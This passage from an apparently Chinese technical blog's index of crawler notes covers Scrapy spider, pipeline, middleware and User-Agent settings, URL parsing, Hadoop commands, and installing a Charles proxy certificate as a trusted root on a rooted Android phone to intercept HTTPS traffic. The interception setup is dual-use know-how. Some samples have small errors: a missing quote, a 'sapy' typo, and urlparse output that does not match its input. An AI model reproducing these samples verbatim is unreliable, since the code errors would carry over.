language_">self</span>.crawler_process.spider_loader.<span class="built_in">list</span>()  <span class="comment"># 获取所有的爬虫文件。</span></span><br><span class="line">        <span class="built_in">print</span>(spd_loader_list)</span><br><span class="line">        <span class="comment"># 遍历各爬虫</span></span><br><span class="line">        <span class="keyword">for</span> spname <span class="keyword">in</span> spd_loader_list <span class="keyword">or</span> args:</span><br><span class="line">            <span class="variable language_">self</span>.crawler_process.crawl(spname, **opts.spargs)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;此时启动的爬虫为：&quot;</span> + spname)</span><br><span class="line">        <span class="variable language_">self</span>.crawler_process.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="二、配置settings"><a href="#二、配置settings" class="headerlink" title="二、配置settings"></a>二、配置settings</h3><p>settings.py配置文件还需要加一条。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">COMMANDS_MODULE = <span class="string">&quot;项目名称.目录名称&quot;</span></span><br><span class="line"><span class="comment"># COMMANDS_MODULE = &quot;spider.commands&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="三、启动爬虫"><a href="#三、启动爬虫" class="headerlink" title="三、启动爬虫"></a>三、启动爬虫</h3><p>最后启动crawlall即可！</p><p>当然，安全起见，可以先在命令行中进入该项目所在目录，并输入scrapy -h,可以查看是否有命令crawlall。如果有，那就成功了，可以启动了</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scrapy crawlall</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">爬虫好像是2个同时运行，而且运行时是交叉的</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No72：Scrapy多个spider时指定pipeline</title>
      <link href="/posts/a36ea827.html"/>
      <url>/posts/a36ea827.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、在pipeline里判断爬虫"><a href="#1、在pipeline里判断爬虫" class="headerlink" title="1、在pipeline里判断爬虫"></a>1、在pipeline里判断爬虫</h3><ul><li>settings.py</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">        <span class="string">&quot;xxxx.pipelines.MyPipeline&quot;</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>OneSpider.py</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OneSpider</span>(scrapy.spiders.Spider):</span><br><span class="line">    name = <span class="string">&quot;one&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>TwoSpider.py</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TwoSpider</span>(scrapy.spiders.Spider):</span><br><span class="line">    name = <span class="string">&quot;two&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>pipelines.py</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyPipeline</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_item</span>(<span class="params">self, item, spider</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> spider.name == <span class="string">&quot;one&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;one&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> spider.name == <span class="string">&quot;two&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;two&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2、在爬虫里设置pipeline（scrapy版本必须是1-1以上）"><a href="#2、在爬虫里设置pipeline（scrapy版本必须是1-1以上）" class="headerlink" title="2、在爬虫里设置pipeline（scrapy版本必须是1.1以上）"></a>2、在爬虫里设置pipeline（scrapy版本必须是1.1以上）</h3><ul><li>settings.py</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">        <span class="string">&quot;xxxx.pipelines.OneSpiderPipeline&quot;</span>: <span class="number">300</span>,</span><br><span class="line">        <span class="string">&quot;xxxx.pipelines.TwoSpiderPipeline&quot;</span>: <span class="number">400</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>OneSpider.py</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OneSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&quot;one&quot;</span></span><br><span class="line">    custom_settings = &#123;</span><br><span class="line">            <span class="string">&quot;ITEM_PIPELINES&quot;</span>: &#123;<span class="string">&quot;xxxx.pipelines.OneSpiderPipeline&quot;</span>: <span class="number">300</span>&#125;,</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>TwoSpider.py</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TwoSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&quot;two&quot;</span></span><br><span class="line">    custom_settings = &#123;</span><br><span class="line">            <span class="string">&quot;ITEM_PIPELINES&quot;</span>: &#123;<span class="string">&quot;xxxx.pipelines.TwoSpiderPipeline&quot;</span>: <span class="number">400</span>&#125;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>pipelines.py</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OneSpiderPipeline</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_item</span>(<span class="params">self, item, spider</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;one&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TwoSpiderPipeline</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_item</span>(<span class="params">self, item, spider</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;two&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No71：Scrapy多个item时指定pipeline</title>
      <link href="/posts/81744b57.html"/>
      <url>/posts/81744b57.html</url>
      
        <content type="html"><![CDATA[<p>有时，为了数据的干净清爽，我们可以定义多个item，不同的item存储不同的数据，避免数据污染。但是在pipeline对item进行操作的时候就要加上判断。</p><ul><li>items.py</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OneItem</span>(scrapy.Item):</span><br><span class="line">    one = scrapy.Field()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TwoItem</span>(scrapy.Item):</span><br><span class="line">    two = scrapy.Field()</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>pipelines.py</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> xxx.items <span class="keyword">import</span> OneItem, TwoItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyPipeline</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_item</span>(<span class="params">self, item, spider</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(item, OneItem):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;one&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(item, TwoItem):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;two&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No70：Scrapy在下载中间件中对URL进行修改</title>
      <link href="/posts/e2d0b68b.html"/>
      <url>/posts/e2d0b68b.html</url>
      
        <content type="html"><![CDATA[<ul><li>问题描述：</li></ul><p>用scrapy进行爬虫项目时，已进入URL队列的URL失效，需要进行替换。</p><ul><li>解决方法</li></ul><p>Scrapy可以在下载中间件中对URL进行修改。</p><p>request.url是传递到中间件的url，是只读属性，无法直接修改。</p><p>可以调用_set_url方法，为request对象赋予新的URL。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_request</span>(<span class="params">self, request, spider</span>):</span><br><span class="line">    old_url = request.url</span><br><span class="line">    new_url = request.url.replace(<span class="string">&quot;str&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;str&quot;</span></span><br><span class="line">    request._set_url(new_url)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No69：Scrapy命令基本用法</title>
      <link href="/posts/65ec2b13.html"/>
      <url>/posts/65ec2b13.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、全局命令"><a href="#1、全局命令" class="headerlink" title="1、全局命令"></a>1、全局命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">startproject</span><br><span class="line">genspider</span><br><span class="line">settings</span><br><span class="line">runspider</span><br><span class="line">shell</span><br><span class="line">fetch</span><br><span class="line">view</span><br><span class="line">version</span><br></pre></td></tr></table></figure><h3 id="2、局部命令（只在项目中使用的命令）"><a href="#2、局部命令（只在项目中使用的命令）" class="headerlink" title="2、局部命令（只在项目中使用的命令）"></a>2、局部命令（只在项目中使用的命令）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crawl</span><br><span class="line">check</span><br><span class="line">list</span><br><span class="line">edit</span><br><span class="line">parse</span><br><span class="line">bench</span><br></pre></td></tr></table></figure><h3 id="3、详解"><a href="#3、详解" class="headerlink" title="3、详解"></a>3、详解</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建项目</span></span><br><span class="line">scrapy startproject myproject</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在项目中创建新的spider文件</span></span><br><span class="line">scrapy genspider mydomain mydomain.com</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mydomain为spider文件名，mydomain.com为爬取网站域名</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行spider文件</span></span><br><span class="line">scrapy crawl &lt;spider&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查spider文件有无语法错误</span></span><br><span class="line">scrapy check</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出spider路径下的spider文件</span></span><br><span class="line">scrapy list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编辑spider文件，相当于打开vim模式，实际并不好用，在IDE中编辑更为合适</span></span><br><span class="line">scrapy edit &lt;spider&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将网页内容下载下来，然后在终端打印当前返回的内容，相当于request和urllib方法</span></span><br><span class="line">scrapy fetch &lt;url&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将网页内容保存下来，并在浏览器中打开当前网页内容，直观呈现要爬取网页的内容</span></span><br><span class="line">scrapy view &lt;url&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打开scrapy显示台，类似ipython，可以用来做测试</span></span><br><span class="line">scrapy shell [url]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输出格式化内容：</span></span><br><span class="line">scrapy parse &lt;url&gt; [options]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返回系统设置信息：</span></span><br><span class="line">scrapy settings [options]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">举例</span></span><br><span class="line">scrapy settings --get BOT_NAME</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输出</span></span><br><span class="line">scrapybot</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行spider：</span></span><br><span class="line">sapy runspider &lt;spider_file.py&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">显示scrapy版本，后面加-v可以显示scrapy依赖库的版本</span></span><br><span class="line">scrapy version [-v]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试电脑当前爬取速度性能：</span></span><br><span class="line">scrapy bench</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No68：Scrapy修改User-Agent</title>
      <link href="/posts/d7a85c3f.html"/>
      <url>/posts/d7a85c3f.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、默认请求头"><a href="#1、默认请求头" class="headerlink" title="1、默认请求头"></a>1、默认请求头</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">USER_AGENT = <span class="string">&quot;Scrapy/1.8.0 (+http://scrapy.org)&quot;</span></span><br></pre></td></tr></table></figure><h3 id="2、修改请求头"><a href="#2、修改请求头" class="headerlink" title="2、修改请求头"></a>2、修改请求头</h3><ul><li>全局设置</li></ul><p>所有爬虫的所有连接生效。</p><p>settings.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">USER_AGENT = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>爬虫设置</li></ul><p>单个爬虫所有连接生效。</p><p>spider.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MySpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&quot;myspider&quot;</span></span><br><span class="line">    custom_settings = &#123;</span><br><span class="line">            <span class="string">&quot;USER_AGENT&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>链接设置</li></ul><p>单个请求的单个链接生效。</p><p>spider.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">USER_AGENT = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MySpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&quot;myspider&quot;</span></span><br><span class="line">    start_urls = (<span class="string">&quot;https://baidu.com&quot;</span>,)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">start_requests</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> <span class="variable language_">self</span>.start_urls:</span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(url, headers=&#123;<span class="string">&quot;User-Agent&quot;</span>: USER_AGENT&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>中间件设置</li></ul><p>从整个项目中去修改请求头的设置规则，变化多端，不同的写法，可以配置出不同的设置方式。</p><p>settings.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;DOWNLOADER_MIDDLEWARES&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;myspider.middlewares.UserAgentMiddleware&quot;</span>: <span class="number">544</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>middlewares.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UserAgentMiddleware</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_request</span>(<span class="params">self, request, spider</span>):</span><br><span class="line">        request.headers[<span class="string">&quot;User-Agent&quot;</span>] = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3、优先级"><a href="#3、优先级" class="headerlink" title="3、优先级"></a>3、优先级</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">中间件headers &gt; 爬虫的custom_settings &gt; 项目的settings.py &gt; Scrapy默认</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No67：Python的URL解析方法</title>
      <link href="/posts/8db55bed.html"/>
      <url>/posts/8db55bed.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、提取顶级域名信息"><a href="#1、提取顶级域名信息" class="headerlink" title="1、提取顶级域名信息"></a>1、提取顶级域名信息</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install tld</span><br></pre></td></tr></table></figure><ul><li>获取TLD名称作为字符串返回</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tld <span class="keyword">import</span> get_tld</span><br><span class="line"></span><br><span class="line">get_tld(<span class="string">&quot;http://www.google.co.uk&quot;</span>)</span><br><span class="line"><span class="comment"># &#x27;co.uk&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在不存在的TLD上引发异常或以静默方式失败</span></span><br><span class="line">get_tld(<span class="string">&quot;http://www.google.idontexist&quot;</span>, fail_silently=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># None</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>获取TLD作为对象返回</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tld <span class="keyword">import</span> get_tld</span><br><span class="line"></span><br><span class="line">res = get_tld(<span class="string">&quot;http://some.subdomain.google.co.uk&quot;</span>, as_object=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">res</span><br><span class="line"><span class="comment"># &#x27;co.uk&#x27;</span></span><br><span class="line"></span><br><span class="line">res.subdomain</span><br><span class="line"><span class="comment"># &#x27;some.subdomain&#x27;</span></span><br><span class="line"></span><br><span class="line">res.domain</span><br><span class="line"><span class="comment"># &#x27;google&#x27;</span></span><br><span class="line"></span><br><span class="line">res.tld</span><br><span class="line"><span class="comment"># &#x27;co.uk&#x27;</span></span><br><span class="line"></span><br><span class="line">res.fld</span><br><span class="line"><span class="comment"># &#x27;google.co.uk&#x27;</span></span><br><span class="line"></span><br><span class="line">res.parsed_url</span><br><span class="line"><span class="comment"># SplitResult(</span></span><br><span class="line"><span class="comment">#     scheme=&#x27;http&#x27;,</span></span><br><span class="line"><span class="comment">#     netloc=&#x27;some.subdomain.google.co.uk&#x27;,</span></span><br><span class="line"><span class="comment">#     path=&#x27;&#x27;,</span></span><br><span class="line"><span class="comment">#     query=&#x27;&#x27;,</span></span><br><span class="line"><span class="comment">#     fragment=&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>获取TLD名称返回</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tld <span class="keyword">import</span> get_tld, get_fld</span><br><span class="line"></span><br><span class="line"><span class="comment"># 忽略丢失的协议</span></span><br><span class="line">get_tld(<span class="string">&quot;www.google.co.uk&quot;</span>, fix_protocol=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># &#x27;co.uk&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 忽略丢失的协议</span></span><br><span class="line">get_fld(<span class="string">&quot;www.google.co.uk&quot;</span>, fix_protocol=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># &#x27;google.co.uk&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>获取TLD部件作为元组返回</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tld <span class="keyword">import</span> parse_tld</span><br><span class="line"></span><br><span class="line">parse_tld(<span class="string">&#x27;http://www.google.com&#x27;</span>)</span><br><span class="line"><span class="comment"># &#x27;com&#x27;, &#x27;google&#x27;, &#x27;www&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>获取第一级域名作为字符串返回</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tld <span class="keyword">import</span> get_fld</span><br><span class="line"></span><br><span class="line">get_fld(<span class="string">&quot;http://www.google.co.uk&quot;</span>)</span><br><span class="line"><span class="comment"># &#x27;google.co.uk&#x27;</span></span><br><span class="line"></span><br><span class="line">get_fld(<span class="string">&quot;http://www.google.idontexist&quot;</span>, fail_silently=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># None</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>检查某个tld是否是有效的tld</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tld <span class="keyword">import</span> is_tld</span><br><span class="line"></span><br><span class="line">is_tld(<span class="string">&#x27;co.uk)</span></span><br><span class="line"><span class="string"># True</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">is_tld(&#x27;</span>uk<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"># True</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">is_tld(&#x27;</span>tld.doesnotexist<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"># False</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">is_tld(&#x27;</span>www.google.com<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"># False</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><ul><li>更新TLD名称列表</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># update-tld-names</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tld.utils <span class="keyword">import</span> update_tld_names</span><br><span class="line"></span><br><span class="line">update_tld_names()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2、对URL按照一定格式进行拆分"><a href="#2、对URL按照一定格式进行拆分" class="headerlink" title="2、对URL按照一定格式进行拆分"></a>2、对URL按照一定格式进行拆分</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line">info = urlparse(</span><br><span class="line">        <span class="string">&quot;https://club.jd.com/comment/productPageComments.action?&amp;productId=100000177748&amp;score=0&amp;sortType=5&amp;page=1&amp;pageSize=10&amp;isShadowSku=0&amp;fold=1&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(info)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将url分成六个部分，返回一个包含6个字符串项目的元组：协议，位置，路径，参数，查询，判断。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ParseResult(</span><br><span class="line">        scheme=<span class="string">&quot;https&quot;</span>,</span><br><span class="line">        netloc=<span class="string">&quot;club.jd.com&quot;</span>,</span><br><span class="line">        path=<span class="string">&quot;/comment/productPageComments.action&quot;</span>,</span><br><span class="line">        params=<span class="string">&quot;&quot;</span>,</span><br><span class="line">        query=<span class="string">&quot;&amp;score=0&amp;sortType=5&amp;page=1&amp;pageSize=10&quot;</span>,</span><br><span class="line">        fragment=<span class="string">&quot;&quot;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>scheme是协议，netloc是域名服务器，path是路径，params是参数，query是查询，那么fragment是判断。</p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No66：Hadoop常用命令</title>
      <link href="/posts/b1ef1cb2.html"/>
      <url>/posts/b1ef1cb2.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、FS-Shell"><a href="#1、FS-Shell" class="headerlink" title="1、FS Shell"></a>1、FS Shell</h3><p>调用文件系统(FS)Shell命令应使用bin&#x2F;hadoop fs <args>的形式。</args></p><p>所有的的FS shell命令使用URI路径作为参数。</p><p>URI格式是scheme:&#x2F;&#x2F;authority&#x2F;path。</p><p>对HDFS文件系统，scheme是hdfs，对本地文件系统，scheme是file。</p><p>其中scheme和authority参数都是可选的，如果未加指定，就会使用配置中指定的默认scheme。</p><p>一个HDFS文件或目录比如&#x2F;parent&#x2F;child可以表示成hdfs:&#x2F;&#x2F;namenode:namenodeport&#x2F;parent&#x2F;child，</p><p>或者更简单的&#x2F;parent&#x2F;child（假设你配置文件中的默认值是namenode:namenodeport）。</p><p>大多数FS Shell命令的行为和对应的Unix Shell命令类似，不同之处会在下面介绍各命令使用详情时指出。</p><p>出错信息会输出到stderr，其他信息输出到stdout。</p><h3 id="2、常用命令"><a href="#2、常用命令" class="headerlink" title="2、常用命令"></a>2、常用命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看文件夹</span></span><br><span class="line">hadoop fs -ls /</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新建文件夹</span></span><br><span class="line">hadoop fs -mkdir /test</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上传本地文件</span></span><br><span class="line">hadoop fs -put /本地路径/a.txt /test</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上传本地文件夹</span></span><br><span class="line">hadoop dfs -put /本地路径 /test</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看文件</span></span><br><span class="line">hadoop fs -cat /test/a.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除文件夹</span></span><br><span class="line">hadoop fs -rm -rf /test</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No65：Charles证书设置为系统信任证书(root)</title>
      <link href="/posts/d45cd038.html"/>
      <url>/posts/d45cd038.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、使用MD5计算证书hash值"><a href="#1、使用MD5计算证书hash值" class="headerlink" title="1、使用MD5计算证书hash值"></a>1、使用MD5计算证书hash值</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl x509 -subject_hash_old -in D:\Adownloads\charles-proxy-ssl-proxying-certificate.pem</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">得到密钥</span></span><br><span class="line">3182384b</span><br></pre></td></tr></table></figure><h3 id="2、修改名字"><a href="#2、修改名字" class="headerlink" title="2、修改名字"></a>2、修改名字</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp charles-proxy-ssl-proxying-certificate.pem 3182384b.0</span><br></pre></td></tr></table></figure><h3 id="3、传进手机"><a href="#3、传进手机" class="headerlink" title="3、传进手机"></a>3、传进手机</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb push 3182384b.0 /sdcard/Download</span><br></pre></td></tr></table></figure><h3 id="4、导入系统证书目录-system-etc-security-cacerts"><a href="#4、导入系统证书目录-system-etc-security-cacerts" class="headerlink" title="4、导入系统证书目录(&#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;)"></a>4、导入系统证书目录(&#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;)</h3><p>RE文件管理器<a href="https://www.wandoujia.com/apps/74465">豌豆荚</a></p><p>使用RE文件管理器(root权限)将证书放进系统证书目录。</p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
